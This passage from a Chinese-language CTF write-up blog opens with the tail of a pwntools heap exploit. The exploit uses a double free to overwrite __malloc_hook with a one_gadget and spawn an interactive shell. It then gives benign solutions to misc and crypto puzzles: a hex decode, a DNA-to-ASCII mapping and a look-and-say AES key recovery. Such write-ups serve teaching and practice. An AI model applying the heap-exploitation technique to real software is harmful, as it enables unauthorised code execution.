free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xce0e5</span>
malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>

delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">"BBBBBBBB"</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b"[+]> "</span><span class="token punctuation">,</span><span class="token string">b"1"</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">b"[+]> "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>




p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="DISCORD-SHENANIGANS-V4"><a href="#DISCORD-SHENANIGANS-V4" class="headerlink" title="DISCORD SHENANIGANS V4"></a>DISCORD SHENANIGANS V4</h2><p>discord上的机器人回复信息里有零宽字符，在复制信息的时候发现的</p>
<p><img src="/./G:/ctf/tfcctf/img/1722599774224.png" alt="1722599774224"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ccccc"><a href="#ccccc" class="headerlink" title="ccccc"></a>ccccc</h2><p>去掉c字符后发现是ascii编码</p>
<pre class="line-numbers language-none"><code class="language-none">5c4c4c6c4c3c4c3c5c4c4c6c7cbc6c3c7c3c6c8c6cfc7c5c7c4c5cfc6c3c6cfc7c5c7c4c5cfc6c3c7c4c3c0c5cfc6c3c6cdc7c9c5cfc6c3c6c2c3c0c7c9c5cfc6c3c3c4c6cec6c4c5cfc6c3c6cdc7c9c5cfc6c3c6c4c6cfc6c7c5cfc6c3c6c1c6cec6c4c5cfc6c3c6cdc7c9c5cfc6c3c6c3c3c4c3c7c7cdc0ca
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">hex_string <span class="token operator">=</span> <span class="token string">"5446434354467b6373686f75745f636f75745f6374305f636d795f636230795f63346e645f636d795f63646f675f63616e645f636d795f636334377d0a"</span>
data <span class="token operator">=</span> <span class="token punctuation">[</span>hex_string<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_string<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="GENETICS"><a href="#GENETICS" class="headerlink" title="GENETICS"></a>GENETICS</h2><p>通过搜索发现是一段dna编码 每一组是8bit，刚刚好可以用来表示一个字节，把ACGT四个字符映射回去后 再重新编码用ascii表示可以求出flag</p>
<pre class="line-numbers language-none"><code class="language-none">CCCA CACG CAAT CAAT CCCA CACG CTGT ATAC CCTT CTCT ATAC CGTA CGTA CCTT CGCT ATAT CTCA CCTT CTCA CGGA ATAC CTAT CCTT ATCA CTAT CCTT ATCA CCTT CTCA ATCA CTCA CTCA ATAA ATAA CCTT CCCG ATAT CTAG CTGC CCTT CTAT ATAA ATAA CGTG CTTC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">mapping <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'00'</span><span class="token punctuation">,</span>
    <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'01'</span><span class="token punctuation">,</span>
    <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'10'</span><span class="token punctuation">,</span>
    <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'11'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">dna_to_char</span><span class="token punctuation">(</span>dna_sequence<span class="token punctuation">)</span><span class="token punctuation">:</span>
    binary_string <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> dna_sequence<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>binary_string<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

dna_sequences <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"CCCA"</span><span class="token punctuation">,</span> <span class="token string">"CACG"</span><span class="token punctuation">,</span> <span class="token string">"CAAT"</span><span class="token punctuation">,</span> <span class="token string">"CAAT"</span><span class="token punctuation">,</span> <span class="token string">"CCCA"</span><span class="token punctuation">,</span> <span class="token string">"CACG"</span><span class="token punctuation">,</span> <span class="token string">"CTGT"</span><span class="token punctuation">,</span> <span class="token string">"ATAC"</span><span class="token punctuation">,</span> <span class="token string">"CCTT"</span><span class="token punctuation">,</span>
    <span class="token string">"CTCT"</span><span class="token punctuation">,</span> <span class="token string">"ATAC"</span><span class="token punctuation">,</span> <span class="token string">"CGTA"</span><span class="token punctuation">,</span> <span class="token string">"CGTA"</span><span class="token punctuation">,</span> <span class="token string">"CCTT"</span><span class="token punctuation">,</span> <span class="token string">"CGCT"</span><span class="token punctuation">,</span> <span class="token string">"ATAT"</span><span class="token punctuation">,</span> <span class="token string">"CTCA"</span><span class="token punctuation">,</span> <span class="token string">"CCTT"</span><span class="token punctuation">,</span>
    <span class="token string">"CTCA"</span><span class="token punctuation">,</span> <span class="token string">"CGGA"</span><span class="token punctuation">,</span> <span class="token string">"ATAC"</span><span class="token punctuation">,</span> <span class="token string">"CTAT"</span><span class="token punctuation">,</span> <span class="token string">"CCTT"</span><span class="token punctuation">,</span> <span class="token string">"ATCA"</span><span class="token punctuation">,</span> <span class="token string">"CTAT"</span><span class="token punctuation">,</span> <span class="token string">"CCTT"</span><span class="token punctuation">,</span> <span class="token string">"ATCA"</span><span class="token punctuation">,</span>
    <span class="token string">"CCTT"</span><span class="token punctuation">,</span> <span class="token string">"CTCA"</span><span class="token punctuation">,</span> <span class="token string">"ATCA"</span><span class="token punctuation">,</span> <span class="token string">"CTCA"</span><span class="token punctuation">,</span> <span class="token string">"CTCA"</span><span class="token punctuation">,</span> <span class="token string">"ATAA"</span><span class="token punctuation">,</span> <span class="token string">"ATAA"</span><span class="token punctuation">,</span> <span class="token string">"CCTT"</span><span class="token punctuation">,</span> <span class="token string">"CCCG"</span><span class="token punctuation">,</span>
    <span class="token string">"ATAT"</span><span class="token punctuation">,</span> <span class="token string">"CTAG"</span><span class="token punctuation">,</span> <span class="token string">"CTGC"</span><span class="token punctuation">,</span> <span class="token string">"CCTT"</span><span class="token punctuation">,</span> <span class="token string">"CTAT"</span><span class="token punctuation">,</span> <span class="token string">"ATAA"</span><span class="token punctuation">,</span> <span class="token string">"ATAA"</span><span class="token punctuation">,</span> <span class="token string">"CGTG"</span><span class="token punctuation">,</span> <span class="token string">"CTTC"</span>
<span class="token punctuation">]</span>

flag <span class="token operator">=</span> <span class="token punctuation">[</span>dna_to_char<span class="token punctuation">(</span>seq<span class="token punctuation">)</span> <span class="token keyword">for</span> seq <span class="token keyword">in</span> dna_sequences<span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="CONWAY"><a href="#CONWAY" class="headerlink" title="CONWAY"></a>CONWAY</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> generate_next_key<span class="token punctuation">,</span> flag
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad

initial <span class="token operator">=</span> <span class="token number">11131221131211131231121113112221121321132132211331222113112211</span>

initial <span class="token operator">=</span> generate_next_key<span class="token punctuation">(</span>initial<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>initial<span class="token punctuation">)</span>

initial <span class="token operator">=</span> generate_next_key<span class="token punctuation">(</span>initial<span class="token punctuation">)</span>
h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>initial<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> h<span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>

cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>output.txt</p>
<pre class="line-numbers language-none"><code class="language-none">311311222113111231131112132112311321322112111312211312111322212311322113212221
f143845f3c4d9ad024ac8f76592352127651ff4d8c35e48ca9337422a0d7f20ec0c2baf530695c150efff20bbc17ca4c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这个的目标其实是算出key，key的生成是依赖于generate_next_key，我搜了一下initial和output 搜到了一个叫外观数列的信息，这是一个第<em>n</em>项描述了第<em>n</em>-1项的数字分布 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%A4%96%E8%A7%80%E6%95%B8%E5%88%97">https://zh.wikipedia.org/wiki/%E5%A4%96%E8%A7%80%E6%95%B8%E5%88%97</a></p>
<p>generate_next_key其实就是一个根据inital生成外观数列的函数，只需要把外观数列的生成函数实现出来就能求出key了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpad

<span class="token keyword">def</span> <span class="token function">generate_next_key</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        count <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">while</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            count <span class="token operator">+=</span> <span class="token number">1</span>
        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>

initial <span class="token operator">=</span> <span class="token string">'11131221131211131231121113112221121321132132211331222113112211'</span>

initial <span class="token operator">=</span> generate_next_key<span class="token punctuation">(</span>initial<span class="token punctuation">)</span>
initial <span class="token operator">=</span> generate_next_key<span class="token punctuation">(</span>initial<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>initial<span class="token punctuation">)</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>initial<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> h<span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>

ciphertext <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'f143845f3c4d9ad024ac8f76592352127651ff4d8c35e48ca9337422a0d7f20ec0c2baf530695c150efff20bbc17ca4c'</span><span class="token punctuation">)</span>

cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
decrypted_flag <span class="token operator">=</span> unpad<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>decrypted_flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/08/22/奇奇怪怪格式化字符串漏洞的利用1/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/08/01/ImaginaryCTF/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-08-08 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>57</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li> <li><a href="/tags/heap/">heap<span>13</span></a></li> <li><a href="/tags/tls/">tls<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#pwn"><span class="toc-article-text">pwn</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#GUARD-THE-BYPASS"><span class="toc-article-text">GUARD-THE-BYPASS</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#vspm"><span class="toc-article-text">vspm</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mcback2dabasics"><span class="toc-article-text">mcback2dabasics</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#misc"><span class="toc-article-text">misc</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#DISCORD-SHENANIGANS-V4"><span class="toc-article-text">DISCORD SHENANIGANS V4</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#crypto"><span class="toc-article-text">crypto</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ccccc"><span class="toc-article-text">ccccc</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#GENETICS"><span class="toc-article-text">GENETICS</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CONWAY"><span class="toc-article-text">CONWAY</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
